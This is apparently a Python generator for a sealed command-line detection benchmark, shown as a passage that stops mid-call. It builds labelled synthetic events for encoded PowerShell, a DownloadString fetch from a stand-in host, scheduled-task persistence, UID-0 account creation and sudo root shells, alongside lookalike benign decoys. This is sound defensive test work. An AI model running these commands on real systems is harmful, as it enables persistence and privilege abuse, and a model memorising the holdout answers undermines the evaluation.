"""Author/freeze v3 semantic challenges without importing or executing a detector.

This source includes validation and holdout cases: keep it sealed during tuning.
The first invocation freezes all partitions together. Later invocations verify;
they cannot overwrite a partition or manifest. See docs/EVALUATION_V3.md.
"""

import argparse
import base64
import hashlib
import json
from collections import Counter
from pathlib import Path
from uuid import UUID

ROOT = Path(__file__).resolve().parents[1]
DESTINATION = ROOT / "data/evaluation-v3"
BASELINE = "88bcda800bb877cd1e354301e7b727953157d962"
CLOCK = "2026-11-16T12:00:00Z"
PS = r"C:\Program Files\PowerShell\7\pwsh.exe"
WINPS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
TASK = r"C:\Windows\System32\schtasks.exe"
WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
EXCEL = r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
OUTLOOK = r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"


def digest(value):
    return hashlib.sha256(value.encode()).hexdigest()


def encoded(text):
    # Inert stand-in text; this module never invokes PowerShell or any shell.
    return base64.b64encode(("Write-Output '" + text + "'").encode("utf-16le")).decode()


def serialized(value):
    return (json.dumps(value, indent=2, ensure_ascii=False) + "\n").encode()


class Partition:
    def __init__(self, name):
        self.name = name
        self.rows = []

    def add(
        self,
        family,
        name,
        intent,
        command,
        rules,
        reason,
        *,
        process=PS,
        source="synthetic",
        parent=None,
        fields=None,
        original=None,
        target="root",
        timestamp="2026-11-16T09:00:00Z",
        observability="supported",
    ):
        number = len(self.rows) + 1
        host = f"v3-{self.name}-{number:02d}.lab.invalid"
        sensor = f"v3-{self.name}-sensor-{number:02d}"
        user = f"lab\\analyst-{self.name}"
        if source == "linux_auth":
            payload = (
                f"{timestamp} {host} sudo[1234]: analyst : TTY=pts/1 ; "
                f"PWD=/srv/operations ; USER={target} ; COMMAND={command}"
            )
        elif source == "sysmon":
            payload = {
                "EventID": 1,
                "UtcTime": timestamp,
                "Computer": host,
                "User": user,
                "Image": process,
                "CommandLine": command,
                "RecordID": f"v3-{self.name}-{number:02d}",
            }
            if parent:
                payload["ParentImage"] = parent
            if original:
                payload["OriginalFileName"] = original
        else:
            payload = {
                "host": host,
                "timestamp": timestamp,
                "kind": "process",
                "user": user,
                "process": process,
                "command": command,
                "external_id": f"v3-{self.name}-{number:02d}",
            }
            if parent:
                payload["parent"] = parent
            if fields or original:
                payload["fields"] = dict(fields or {})
                if original:
                    payload["fields"]["original_file_name"] = original
        row = {
            "id": f"v3-{self.name}-{name}",
            "origin_template": family,
            "session_id": f"v3-{self.name}-session-{number:02d}",
            "suspicious": intent,
            "reason": reason,
            "observability": observability,
            "expected_rule_ids": [str(UUID(int=i)) for i in rules],
            "events": [{"source": source, "sensor": sensor, "payload": payload}],
            "context": {},
        }
        self.rows.append(row)
        return row

    def ps(self, family, name, intent, args, rules, reason, **kwargs):
        process = kwargs.pop("process", PS)
        executable = "powershell.exe" if process == WINPS else "pwsh.exe"
        return self.add(
            family, name, intent, executable + " " + args, rules, reason, process=process, **kwargs
        )

    def task(self, family, name, intent, args, rules, reason):
        return self.add(
            family, name, intent, "schtasks.exe " + args, rules, reason, process=TASK, source="sysmon"
        )

    def uid(self, family, name, intent, args, rules, reason, **kwargs):
        return self.add(
            family,
            name,
            intent,
            "/usr/sbin/useradd " + args,
            rules,
            reason,
            process="/usr/sbin/useradd",
            **kwargs,
        )

    def sudo(self, family, name, intent, command, rules, reason, **kwargs):
        return self.add(family, name, intent, command, rules, reason, source="linux_auth", **kwargs)

    def script(
        self,
        family,
        name,
        intent,
        args,
        rules,
        reason,
        *,
        path,
        observed=None,
        binding="match",
        indicator="active",
        hash_match=True,
        **kwargs,
    ):
        sha = digest(f"synthetic-not-a-file:{self.name}:{name}")
        row = self.ps(
            family,
            name,
            intent,
            args,
            rules,
            reason,
            fields={"script_path": observed if observed is not None else path, "script_sha256": sha},
            **kwargs,
        )
        event = row["events"][0]
        if binding != "absent":
            row["context"]["bindings"] = [
                {
                    "key": "collector",
                    "principal": "evaluation",
                    "source": event["source"],
                    "sensor": event["sensor"] if binding != "wrong-sensor" else "other-sensor",
                    "host": event["payload"]["host"] if binding != "wrong-host" else "other.lab.invalid",
                    "expires_at": "2026-11-17T00:00:00Z",
                    "reason": "Synthetic collector enrollment for scoped script observation",
                }
            ]
        if indicator != "absent":
            row["context"]["indicators"] = [
                {
                    "kind": "sha256",
                    "value": sha if hash_match else digest("a-different-file"),
                    "purpose": "powershell-script",
                    "version": f"v3-{self.name}-{name}",
                    "provenance": "Engineer-authored synthetic intelligence; no external reputation claim",
                    "valid_from": "2026-11-16T09:00:00Z"
                    if indicator == "starts-at-event"
                    else "2026-11-16T00:00:00Z",
                    "valid_until": "2026-11-16T09:00:00Z"
                    if indicator == "ends-at-event"
                    else "2026-11-17T00:00:00Z",
                    "expires_at": "2026-11-16T12:00:00Z"
                    if indicator == "expires-at-clock"
                    else "2026-11-17T00:00:00Z",
                    "reason": "Synthetic investigation established this exact content digest",
                }
            ]
        return row


def development():
    p = Partition("development")
    # Five engine signals; full, short and alternate encoded options plus inline evidence.
    p.ps(
        "dev-encoded-spelling",
        "encoded-full",
        True,
        "-NoProfile -EncodedCommand " + encoded("dev-a"),
        [2],
        "Assigned malicious encoded execution; full engine option and inert stand-in content.",
    )
    p.ps(
        "dev-encoded-spelling",
        "encoded-short-e",
        True,
        "-e " + encoded("dev-b"),
        [2],
        "Assigned malicious encoded execution through the documented short e option.",
    )
    p.ps(
        "dev-encoded-spelling",
        "encoded-short-ec",
        True,
        "-ec " + encoded("dev-c"),
        [2],
        "Assigned malicious encoded execution through the documented ec alias.",
    )
    p.ps(
        "dev-inline-markers",
        "inline-download",
        True,
        "-Command \"(New-Object Net.WebClient).DownloadString('https://stage.invalid/a')\"",
        [2],
        "Assigned unapproved payload retrieval; inline download marker is observable.",
    )
    p.ps(
        "dev-inline-markers",
        "inline-decode",
        True,
        "-Command \"[Convert]::FromBase64String('ZGV2')\"",
        [2],
        "Assigned malicious inline decoding; inert string preserves the declared heuristic.",
    )
    # Three actual create commands, not mentions of the verb in values.
    p.task(
        "dev-create-local",
        "task-daily",
        True,
        '/Create /SC DAILY /TN "Telemetry Intake" /TR "C:\\Stage\\intake.exe"',
        [4],
        "Assigned unauthorized persistence through an actual create verb.",
    )
    p.task(
        "dev-create-local",
        "task-onlogon",
        True,
        '/CREATE /SC ONLOGON /TN "Session Resume" /TR "C:\\Stage\\resume.exe" /F',
        [4],
        "Assigned unauthorized logon persistence; case-insensitive verb.",
    )
    p.task(
        "dev-create-local",
        "task-xml",
        True,
        '/Create /XML "C:\\Stage\\job.xml" /TN "Imported Job"',
        [4],
        "Assigned malicious imported task; command evidences creation attempt, not success.",
    )
    p.uid(
        "dev-uid-explicit",
        "uid-separated",
        True,
        "-o -u 0 recovery_shadow",
        [5],
        "Assigned unauthorized root-equivalent account attempt using separated UID value.",
    )
    p.uid(
        "dev-uid-explicit",
        "uid-attached",
        True,
        "-N -o -u0 observer_shadow",
        [5],
        "Assigned unauthorized UID-zero attempt with attached short argument.",
    )
    p.uid(
        "dev-uid-explicit",
        "uid-long-equals",
        True,
        "--non-unique --uid=0 svc_shadow",
        [5],
        "Assigned unauthorized UID-zero attempt with exact long option.",
    )
    p.sudo(
        "dev-sudo-direct",
        "sudo-bash",
        True,
        "/bin/bash -c id",
        [6],
        "Assigned unauthorized root shell; the executed command is bash.",
    )
    p.sudo(
        "dev-sudo-direct",
        "sudo-sh",
        True,
        "/bin/sh -c whoami",
        [6],
        "Assigned unauthorized root shell; sh is the executable.",
    )
    p.sudo(
        "dev-sudo-direct",
        "sudo-zsh",
        True,
        "/usr/bin/zsh -c pwd",
        [6],
        "Assigned unauthorized root shell; zsh is the executable.",
    )
    p.ps(
        "dev-office-file",
        "office-bypass",
        True,
        '-ExecutionPolicy Bypass -File "C:\\Stage\\invoice.ps1"',
        [8],
        "Assigned malicious document child; bypass precedes the File boundary.",
        parent=WORD,
    )
    p.ps(
        "dev-office-file",
        "office-hidden",
        True,
        '-WindowStyle Hidden -File "C:\\Stage\\sheet.ps1"',
        [8],
        "Assigned malicious spreadsheet child; hidden engine window precedes File.",
        parent=EXCEL,
    )
    p.script(
        "dev-script-exact",
        "script-digest",
        True,
        '-File "C:\\Stage\\sync.ps1"',
        [8],
        "Assigned malicious script; exact observed path and active digest are collector-bound.",
        path=r"C:\Stage\sync.ps1",
    )
    p.ps(
        "dev-renamed-original",
        "renamed-office",
        True,
        '-ep Bypass -File "C:\\Stage\\notice.ps1"',
        [8],
        "Assigned malicious renamed PowerShell; original filename and document parent are observed.",
        process=r"C:\Stage\worker.exe",
        original="pwsh.exe",
        parent=WORD,
        source="sysmon",
    )
    p.ps(
        "dev-unobservable-content",
        "hidden-script-intent",
        True,
        '-File "C:\\Ops\\refresh.ps1"',
        [],
        "Assigned malicious script content is absent from telemetry; ordinary path alone cannot establish it.",
        observability="unobservable",
    )
    p.ps(
        "dev-unobservable-content",
        "stdin-intent",
        True,
        "-NoProfile -Command -",
        [],
        "Assigned malicious standard-input program is not captured; command-line evidence cannot reveal it.",
        observability="unobservable",
    )

    # Seventeen challenging negatives plus three authorized-but-alertable actions.
    p.ps(
        "dev-engine-value-boundary",
        "pipe-value",
        False,
        '-CustomPipeName "-EncodedCommand" -Command "Write-Output ready"',
        [],
        "Authorized debugger endpoint name consumes the apparent encoded option as a value.",
    )
    p.ps(
        "dev-engine-value-boundary",
        "configuration-value",
        False,
        '-ConfigurationName "-enc" -Command "Get-Date"',
        [],
        "Authorized named endpoint value is not an encoded engine option.",
    )
    p.ps(
        "dev-file-arguments",
        "script-encoded-argument",
        False,
        '-File "C:\\Ops\\report.ps1" -EncodedCommand "report-id"',
        [],
        "Authorized script parameter happens to share an engine parameter name; File ended engine parsing.",
    )
    p.ps(
        "dev-file-arguments",
        "script-download-text",
        False,
        '-File "C:\\Ops\\help.ps1" -Example "DownloadString"',
        [],
        "Authorized help generator receives a marker string as a script argument, not inline PowerShell code.",
    )
    p.task(
        "dev-task-value-boundary",
        "task-query-name",
        False,
        '/Query /TN "docs /create guide" /FO LIST',
        [],
        "Authorized query names an existing task containing a verb-like word.",
    )
    p.task(
        "dev-task-value-boundary",
        "task-change-action",
        False,
        '/Change /TN "Report" /TR "C:\\Ops\\report.exe /create"',
        [],
        "Authorized task modification includes create in its action; no create verb is executed.",
    )
    p.task(
        "dev-task-value-boundary",
        "task-run-name",
        False,
        '/Run /TN "Archive /create snapshot"',
        [],
        "Authorized run of an existing task; task-name text is not a create command.",
    )
    p.uid(
        "dev-uid-consumed-comment",
        "uid-comment-separated",
        False,
        '-c "-u 0" -u 1801 engineer',
        [],
        "Authorized ordinary account; the zero-looking substring belongs to a comment.",
    )
    p.uid(
        "dev-uid-consumed-comment",
        "uid-comment-token",
        False,
        "-c -u0 -u 1802 operator",
        [],
        "Authorized account; the option-looking token is consumed by comment before the nonzero UID.",
    )
    p.uid(
        "dev-uid-consumed-comment",
        "uid-long-comment",
        False,
        '--comment="--uid=0" --uid=1803 auditor',
        [],
        "Authorized account comment contains an apparent long UID option.",
    )
    p.sudo(
        "dev-sudo-data-arguments",
        "sudo-stat-shell",
        False,
        "/usr/bin/stat /bin/bash",
        [],
        "Authorized metadata inspection executes stat; a shell pathname is only its operand.",
    )
    p.sudo(
        "dev-sudo-data-arguments",
        "sudo-cat-profile",
        False,
        "/usr/bin/cat /etc/profile.d/bin/sh",
        [],
        "Authorized file inspection; a path suffix resembling a shell is not the executable.",
    )
    p.sudo(
        "dev-sudo-data-arguments",
        "sudo-print-shell",
        False,
        "/usr/bin/printf '%s' /bin/zsh",
        [],
        "Authorized print operation; the shell path is data.",
    )
    p.script(
        "dev-context-path-scope",
        "context-other-path",
        False,
        '-File "C:\\Ops\\clean.ps1"',
        [],
        "Authorized clean file; collector hash belongs to a different observed path.",
        path=r"C:\Ops\clean.ps1",
        observed=r"C:\Stage\different.ps1",
    )
    p.script(
        "dev-context-path-scope",
        "context-no-binding",
        False,
        '-File "C:\\Ops\\verify.ps1"',
        [],
        "Authorized validation run; unbound synthetic digest cannot establish collector-attributed intelligence.",
        path=r"C:\Ops\verify.ps1",
        binding="absent",
    )
    p.ps(
        "dev-context-office-boundary",
        "office-post-file-bypass",
        False,
        '-File "C:\\Ops\\export.ps1" -ExecutionPolicy Bypass',
        [],
        "Authorized document export; Bypass is a script argument rather than an engine policy.",
        parent=WORD,
    )
    p.ps(
        "dev-context-office-boundary",
        "office-normal-file",
        False,
        '-WindowStyle Normal -File "C:\\Ops\\publish.ps1"',
        [],
        "Authorized Office script without a hidden/bypass engine setting or file intelligence.",
        parent=EXCEL,
    )
    p.ps(
        "dev-authorized-ambiguity",
        "authorized-encoded",
        False,
        "-EncodedCommand " + encoded("authorized-dev-maintenance"),
        [2],
        "Authorized maintenance uses encoded execution without machine-readable action approval; the heuristic should still alert.",
        observability="authorized-but-alertable",
    )
    p.task(
        "dev-authorized-ambiguity",
        "authorized-task",
        False,
        '/Create /SC WEEKLY /TN "Backup Verify" /TR "C:\\Ops\\backup.exe"',
        [4],
        "Authorized scheduled backup without a scoped approval; intent is benign but the create predicate is met.",
    )
    p.rows[-1]["observability"] = "authorized-but-alertable"
    p.uid(
        "dev-authorized-ambiguity",
        "authorized-uid",
        False,
        "-o --uid 0 lab_rescue",
        [5],
        "Authorized isolated recovery lab creates a root-equivalent account; rule has no authorization baseline.",
        observability="authorized-but-alertable",
    )
    return p


def validation():
    p = Partition("validation")
    p.ps(
        "validation-engine-after-values",
        "encoded-after-format",
        True,
        "-InputFormat Text -OutputFormat XML -EncodedCommand " + encoded("val-format"),
        [2],
        "Assigned malicious encoded execution follows consumed format option values.",
    )
    p.ps(
        "validation-engine-after-values",
        "encoded-after-policy",
        True,
        "-ExecutionPolicy RemoteSigned -ec " + encoded("val-policy"),
        [2],
        "Assigned malicious encoded execution; policy value must be consumed before ec.",
    )
    p.ps(
        "validation-engine-after-values",
        "encoded-after-window",
        True,
        "-WindowStyle Minimized -e " + encoded("val-window"),
        [2],
        "Assigned malicious encoded execution after a valid window-style value.",
    )
    p.ps(
        "validation-engine-after-values",
        "encoded-after-endpoint",
        True,
        "-ConfigurationName AnalystEndpoint -EncodedCommand " + encoded("val-endpoint"),
        [2],
        "Assigned malicious encoded execution inside a named session endpoint.",
    )
    p.ps(
        "validation-engine-after-values",
        "encoded-after-pipe",
        True,
        "-CustomPipeName diagnostics -ec " + encoded("val-pipe"),
        [2],
        "Assigned malicious encoded execution after a separate pipe-name value.",
    )
    p.task(
        "validation-create-identity",
        "task-system",
        True,
        '/Create /SC HOURLY /RU SYSTEM /TN "Cache Refresh" /TR "C:\\Stage\\cache.exe"',
        [4],
        "Assigned unauthorized SYSTEM scheduled action.",
    )
    p.task(
        "validation-create-identity",
        "task-interactive",
        True,
        '/Create /SC DAILY /IT /TN "Desktop Bridge" /TR "C:\\Stage\\bridge.exe"',
        [4],
        "Assigned unauthorized interactive scheduled action.",
    )
    p.task(
        "validation-create-identity",
        "task-highest",
        True,
        '/Create /SC ONSTART /RL HIGHEST /TN "Start Helper" /TR "C:\\Stage\\start.exe"',
        [4],
        "Assigned unauthorized high-privilege startup task.",
    )
    p.uid(
        "validation-uid-numeric-forms",
        "uid-zero-padded-long",
        True,
        "-o --uid 00 val_bridge",
        [5],
        "Assigned unauthorized UID-zero attempt; decimal zero with leading zeros is still zero.",
    )
    p.uid(
        "validation-uid-numeric-forms",
        "uid-zero-padded-short",
        True,
        "-o -u000 val_agent",
        [5],
        "Assigned unauthorized UID-zero attempt; attached zero-valued argument.",
    )
    p.uid(
        "validation-uid-numeric-forms",
        "uid-after-comment",
        True,
        '-c "service migration" -N -o -u 0 val_migrate',
        [5],
        "Assigned unauthorized root-equivalent account after unrelated consumed options.",
    )
    p.sudo(
        "validation-sudo-lexical",
        "sudo-quoted",
        True,
        '"/bin/bash" -l',
        [6],
        "Assigned unauthorized root shell; balanced executable quoting is lexical, not a path change.",
    )
    p.sudo(
        "validation-sudo-lexical",
        "sudo-usr-sh",
        True,
        "/usr/bin/sh -c 'id -u'",
        [6],
        "Assigned unauthorized root shell using the usr-bin path.",
    )
    p.sudo(
        "validation-sudo-lexical",
        "sudo-zsh-login",
        True,
        "/bin/zsh -l",
        [6],
        "Assigned unauthorized root login-style shell.",
    )
    p.ps(
        "validation-office-abbreviations",
        "office-short-policy",
        True,
        '-ep Bypass -f "C:\\Stage\\attachment.ps1"',
        [8],
        "Assigned malicious document child uses supported short policy and file options.",
        parent=WORD,
    )
    p.ps(
        "validation-office-abbreviations",
        "office-short-window",
        True,
        '-w Hidden -f "C:\\Stage\\contacts.ps1"',
        [8],
        "Assigned malicious mail client child uses short hidden-window and file options.",
        parent=OUTLOOK,
    )
    p.script(
        "validation-context-inclusive-start",
        "indicator-start",
        True,
        '-File "C:\\Stage\\load.ps1"',
        [8],
        "Assigned malicious script at the inclusive start of a versioned intelligence window.",
        path=r"C:\Stage\load.ps1",
        indicator="starts-at-event",
    )
    p.script(
        "validation-context-lexical-path",
        "path-case",
        True,
        '-File "C:\\STAGE\\Launch.PS1"',
        [8],
        "Assigned malicious script; Windows observed path differs only in letter case.",
        path=r"C:\STAGE\Launch.PS1",
        observed=r"c:\stage\launch.ps1",
    )
    p.ps(
        "validation-unobservable-program",
        "ordinary-inline-intent",
        True,
        '-Command "Get-ChildItem C:\\Projects"',
        [],
        "Assigned malicious reconnaissance uses an ordinary command; evidence has no supported malicious predicate.",
        observability="unobservable",
    )
    p.ps(
        "validation-unobservable-program",
        "implicit-script-intent",
        True,
        '"C:\\Ops\\inventory.ps1"',
        [],
        "Assigned malicious script content is unobserved; implicit file invocation has no scoped content evidence.",
        observability="unobservable",
    )

    p.ps(
        "validation-engine-attached-data",
        "settings-file-value",
        False,
        '-SettingsFile "C:\\Ops\\-EncodedCommand.json" -Command "Get-Date"',
        [],
        "Authorized settings filename includes option-like text; it is not an engine option.",
    )
    p.ps(
        "validation-engine-attached-data",
        "working-directory-value",
        False,
        '-WorkingDirectory "C:\\Ops\\-enc" -Command "Get-Location"',
        [],
        "Authorized working directory contains an encoded-option spelling as path text.",
    )
    p.ps(
        "validation-command-boundary",
        "inline-encoded-text",
        False,
        "-Command \"Write-Output '-EncodedCommand'\"",
        [],
        "Authorized command prints an engine-option name; it does not request encoded execution.",
    )
    p.ps(
        "validation-command-boundary",
        "inline-ec-text",
        False,
        "-Command \"Write-Output '-ec report-token'\"",
        [],
        "Authorized command prints an abbreviated option as literal data.",
    )
    p.task(
        "validation-task-existing-operations",
        "task-delete-name",
        False,
        '/Delete /TN "old /create helper" /F',
        [],
        "Authorized deletion of an existing task whose name contains a verb-like token.",
    )
    p.task(
        "validation-task-existing-operations",
        "task-end-name",
        False,
        '/End /TN "daily /create extract"',
        [],
        "Authorized termination of an existing task; create is only in the name.",
    )
    p.task(
        "validation-task-existing-operations",
        "task-change-quoted-value",
        False,
        '/Change /TN "Current" /TR "C:\\Ops\\worker.exe /create /sc daily" /ENABLE',
        [],
        "Authorized action update contains a complete-looking nested create fragment as data.",
    )
    p.uid(
        "validation-uid-other-values",
        "uid-password-token",
        False,
        '-p "-u0" -u 2201 val_user',
        [],
        "Authorized account; zero-looking token is a password option value, not UID.",
    )
    p.uid(
        "validation-uid-other-values",
        "uid-home-token",
        False,
        '-d "/srv/-u0" --uid 2202 val_home',
        [],
        "Authorized account with an option-like path segment and nonzero UID.",
    )
    p.uid(
        "validation-uid-other-values",
        "uid-end-options",
        False,
        "-u 2203 -- val_u0",
        [],
        "Authorized nonzero account; end-of-options terminates interpretation.",
    )
    p.sudo(
        "validation-sudo-inspection",
        "sudo-test-shell",
        False,
        "/usr/bin/test -x /usr/bin/bash",
        [],
        "Authorized executable check invokes test, not the shell being checked.",
    )
    p.sudo(
        "validation-sudo-inspection",
        "sudo-file-shell",
        False,
        "/usr/bin/file /bin/sh",
        [],
        "Authorized file classification invokes file; shell path is an operand.",
    )
    p.sudo(
        "validation-sudo-inspection",
        "sudo-editor-shell",
        False,
        "/usr/bin/vi /etc/skel/bin/zsh",
        [],
        "Authorized text editing of a similarly named path is not shell execution.",
    )
    p.script(
        "validation-context-half-open",
        "indicator-end",
        False,
        '-File "C:\\Ops\\retired.ps1"',
        [],
        "Authorized historical replay occurs exactly at indicator end; half-open window excludes it.",
        path=r"C:\Ops\retired.ps1",
        indicator="ends-at-event",
    )
    p.script(
        "validation-context-half-open",
        "indicator-expired",
        False,
        '-File "C:\\Ops\\archive.ps1"',
        [],
        "Authorized retrospective sample; intelligence expires exactly at processing time.",
        path=r"C:\Ops\archive.ps1",
        indicator="expires-at-clock",
    )
    p.script(
        "validation-context-identity",
        "wrong-sensor",
        False,
        '-File "C:\\Ops\\sensor-test.ps1"',
        [],
        "Authorized sensor test; collector binding names another sensor.",
        path=r"C:\Ops\sensor-test.ps1",
        binding="wrong-sensor",
    )
    p.ps(
        "validation-office-data-value",
        "office-pipe-bypass",
        False,
        '-CustomPipeName "-ExecutionPolicy Bypass" -File "C:\\Ops\\compose.ps1"',
        [],
        "Authorized Office automation; bypass-looking text is wholly inside the pipe name.",
        parent=WORD,
    )
    p.ps(
        "validation-authorized-ambiguity",
        "authorized-encoded",
        False,
        "-NoLogo -ec " + encoded("authorized-val-diagnostics"),
        [2],
        "Authorized diagnostic execution uses encoding without a scoped approval; heuristic remains alertable.",
        observability="authorized-but-alertable",
    )
    p.task(
        "validation-authorized-ambiguity",
        "authorized-task",
        False,
        '/Create /SC MONTHLY /TN "Inventory Reconcile" /TR "C:\\Ops\\reconcile.exe"',
        [4],
        "Authorized administrative task without a scoped action approval still meets the create predicate.",
    )
    p.rows[-1]["observability"] = "authorized-but-alertable"
    p.sudo(
        "validation-authorized-ambiguity",
        "authorized-sudo",
        False,
        "/bin/bash -c 'systemctl status cron'",
        [6],
        "Authorized emergency root-shell diagnostics; no user authorization baseline is modeled.",
        observability="authorized-but-alertable",
    )
    return p


def holdout():
    p = Partition("holdout")
    p.ps(
        "holdout-engine-combinations",
        "encoded-mixed-case",
        True,
        "-nOpRoFiLe -EC " + encoded("holdout-case"),
        [2],
        "Assigned malicious encoded execution combines mixed-case switches with an alias.",
    )
    p.ps(
        "holdout-engine-combinations",
        "encoded-quoted-value",
        True,
        '-NonInteractive -EncodedCommand "' + encoded("holdout-quoted") + '"',
        [2],
        "Assigned malicious execution uses a quoted encoded-command argument.",
    )
    p.ps(
        "holdout-engine-combinations",
        "encoded-after-multiple-values",
        True,
        "-OutputFormat Text -ExecutionPolicy Bypass -e " + encoded("holdout-multi"),
        [2],
        "Assigned malicious encoding follows two separate consumed engine values.",
    )
    p.ps(
        "holdout-engine-combinations",
        "encoded-winps",
        True,
        "-NoProfile -EncodedCommand " + encoded("holdout-winps"),
        [2],
        "Assigned malicious encoding on Windows PowerShell 5.1 identity.",
        process=WINPS,
        source="sysmon",
    )
    p.ps(
        "holdout-engine-combinations",
        "encoded-renamed",
        True,
        "-NoLogo -ec " + encoded("holdout-renamed"),
        [2],
        "Assigned malicious encoded execution by renamed PowerShell with observed original filename.",
        process=r"C:\Tools\diagnostic.exe",
        original="pwsh.exe",
        source="sysmon",
    )
    p.task(
        "holdout-create-action-content",
        "task-action-create-word",
        True,
        '/Create /SC DAILY /TN "Daily Construct" /TR "C:\\Stage\\build.exe /create"',
        [4],
        "Assigned unauthorized create verb remains observable even when action also contains create.",
    )
    p.task(
        "holdout-create-action-content",
        "task-nested-name",
        True,
        '/Create /SC WEEKLY /TN "\\Support\\Queue Monitor" /TR "C:\\Stage\\monitor.exe"',
        [4],
        "Assigned unauthorized task creation in a named task folder.",
    )
    p.task(
        "holdout-create-action-content",
        "task-spaced-action",
        True,
        '/cReAtE /SC ONIDLE /I 10 /TN "Idle Agent" /TR "C:\\Program Data\\agent.exe"',
        [4],
        "Assigned unauthorized idle task with quoted action path and mixed-case verb.",
    )
    p.uid(
        "holdout-uid-consumption-chain",
        "uid-after-value-lookalike",
        True,
        '-c "-u 1701" -o --uid=00 hold_service',
        [5],
        "Assigned unauthorized UID-zero attempt; nonzero comment must not mask real UID option.",
    )
    p.uid(
        "holdout-uid-consumption-chain",
        "uid-after-shell",
        True,
        "--shell /bin/false -o -u 0000 hold_observer",
        [5],
        "Assigned unauthorized root-equivalent account uses a non-login shell but explicit UID zero.",
    )
    p.uid(
        "holdout-uid-consumption-chain",
        "uid-after-home",
        True,
        "-d /srv/hold-cache -M -N -o -u0 hold_cache",
        [5],
        "Assigned unauthorized UID-zero attempt follows several unrelated standard options.",
    )
    p.sudo(
        "holdout-sudo-command-structure",
        "sudo-sh-argument-path",
        True,
        "/bin/sh -c 'printf /usr/bin/id'",
        [6],
        "Assigned unauthorized root shell remains a shell even when its script names another executable.",
    )
    p.sudo(
        "holdout-sudo-command-structure",
        "sudo-bash-long-option",
        True,
        "/usr/bin/bash --noprofile -c 'id -un'",
        [6],
        "Assigned unauthorized root shell uses a long shell option after the executable.",
    )
    p.sudo(
        "holdout-sudo-command-structure",
        "sudo-zsh-quoted-executable",
        True,
        "'/usr/bin/zsh' -c 'print ready'",
        [6],
        "Assigned unauthorized root shell with balanced single-quoted executable.",
    )
    p.ps(
        "holdout-office-combinations",
        "office-multiple-engine-options",
        True,
        '-NoProfile -OutputFormat Text -WindowStyle Hidden -File "C:\\Stage\\mail-cache.ps1"',
        [8],
        "Assigned malicious mail child; a hidden engine option survives preceding consumed format values.",
        parent=OUTLOOK,
    )
    p.ps(
        "holdout-office-combinations",
        "office-policy-alias",
        True,
        '-ex Bypass -File "C:\\Stage\\table-cache.ps1"',
        [8],
        "Assigned malicious spreadsheet child uses the documented ex policy alias.",
        parent=EXCEL,
    )
    p.script(
        "holdout-context-argument-tail",
        "digest-file-arguments",
        True,
        '-File "C:\\Stage\\connect.ps1" -Mode report -ExecutionPolicy Default',
        [8],
        "Assigned malicious observed file digest remains evidence regardless of script parameters after File.",
        path=r"C:\Stage\connect.ps1",
    )
    p.script(
        "holdout-context-argument-tail",
        "digest-engine-prefix",
        True,
        '-NoProfile -InputFormat Text -f "C:\\Stage\\session.ps1"',
        [8],
        "Assigned malicious observed file uses short File after consumed format value.",
        path=r"C:\Stage\session.ps1",
    )
    p.ps(
        "holdout-unobservable-role",
        "plain-command-intent",
        True,
        '-Command "Get-Process | Select-Object Name"',
        [],
        "Assigned malicious discovery is observationally identical to ordinary administration; no supported signal.",
        observability="unobservable",
    )
    p.ps(
        "holdout-unobservable-role",
        "file-content-intent",
        True,
        '-NoProfile -File "C:\\Ops\\daily-summary.ps1"',
        [],
        "Assigned malicious file content is missing; a neutral path without context cannot establish intent.",
        observability="unobservable",
    )

    p.ps(
        "holdout-engine-consumed-tokens",
        "pipe-exact-ec",
        False,
        '-CustomPipeName "-ec" -NoProfile -Command "Get-Culture"',
        [],
        "Authorized debugger pipe has the exact ec token as its consumed name.",
    )
    p.ps(
        "holdout-engine-consumed-tokens",
        "configuration-exact-encoded",
        False,
        '-ConfigurationName "-EncodedCommand" -NoLogo -Command "Get-UICulture"',
        [],
        "Authorized endpoint name is exactly the encoded option spelling; it is consumed as data.",
    )
    p.ps(
        "holdout-script-tail-literals",
        "file-decode-argument",
        False,
        '-f "C:\\Ops\\format.ps1" -Text "FromBase64String"',
        [],
        "Authorized formatting script receives a decode marker as literal input after File.",
    )
    p.ps(
        "holdout-script-tail-literals",
        "file-ec-argument",
        False,
        '-NoProfile -f "C:\\Ops\\archive-index.ps1" -ec "index-number"',
        [],
        "Authorized script argument uses the ec name; it is not an engine option after File.",
    )
    p.task(
        "holdout-task-compound-values",
        "task-query-compound-name",
        False,
        '/Query /TN "\\Archive\\draft /create /sc daily" /V /FO LIST',
        [],
        "Authorized existing task query contains several option-like fragments inside its name.",
    )
    p.task(
        "holdout-task-compound-values",
        "task-change-action-only",
        False,
        '/Change /TN "Pipeline" /TR "C:\\Ops\\worker.exe /Create /TN child" /DISABLE',
        [],
        "Authorized task change passes a nested-looking command as action data, not an outer create verb.",
    )
    p.task(
        "holdout-task-compound-values",
        "task-run-folder",
        False,
        '/Run /TN "\\Ops\\release /CREATE package" /I',
        [],
        "Authorized run of an existing task; case-insensitive create text remains within the name.",
    )
    p.uid(
        "holdout-uid-decoys",
        "uid-attached-comment",
        False,
        "-c-u0 --uid 3101 hold_engineer",
        [],
        "Authorized account; attached short comment consumes u0 text and explicit UID is nonzero.",
    )
    p.uid(
        "holdout-uid-decoys",
        "uid-long-comment-space",
        False,
        '--comment "--uid 0" -u3102 hold_operator',
        [],
        "Authorized nonzero account; UID-looking tokens occur only inside a consumed comment.",
    )
    p.uid(
        "holdout-uid-decoys",
        "uid-zero-prefix-nonzero",
        False,
        "--uid=0003103 -o hold_auditor",
        [],
        "Authorized ordinary numeric UID starts with zeros but is not numerically zero.",
    )
    p.sudo(
        "holdout-sudo-executable-identity",
        "sudo-copy-shell",
        False,
        "/usr/bin/cp /bin/bash /srv/recovery/bash",
        [],
        "Authorized binary backup executes cp; copying a shell is not starting it.",
    )
    p.sudo(
        "holdout-sudo-executable-identity",
        "sudo-hash-shell",
        False,
        "/usr/bin/sha256sum /usr/bin/zsh",
        [],
        "Authorized integrity check executes sha256sum, with a shell pathname as data.",
    )
    p.sudo(
        "holdout-sudo-executable-identity",
        "sudo-nonroot-shell",
        False,
        "/bin/sh -c 'id -u'",
        [],
        "Authorized service-account shell targets a non-root identity; root-target predicate is absent.",
        target="service",
    )
    p.script(
        "holdout-context-binding-digest",
        "wrong-host",
        False,
        '-File "C:\\Ops\\host-check.ps1"',
        [],
        "Authorized host check; binding belongs to another host despite a matching synthetic digest.",
        path=r"C:\Ops\host-check.ps1",
